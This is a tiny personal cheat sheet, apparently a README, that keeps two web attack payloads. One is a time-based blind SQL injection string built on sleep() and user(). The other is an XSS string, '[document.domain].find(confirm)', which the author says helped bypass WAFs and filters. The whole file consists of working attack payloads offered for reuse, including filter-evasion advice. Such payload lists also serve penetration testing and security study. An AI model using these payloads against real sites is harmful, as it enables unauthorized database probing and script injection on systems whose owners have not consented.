## Just a useless set of payload used or created by me. Saved here for remembrance.

### SQL Injection
#### Time Based Blind:
 - `(select(if(user()like(user()),sleep(4),sleep(2))))`

### Cross Site Scripting
 - `[document.domain].find(confirm)` (helped me to bypass WAFs/filters or useful if input is echoed or used as variable in js files)
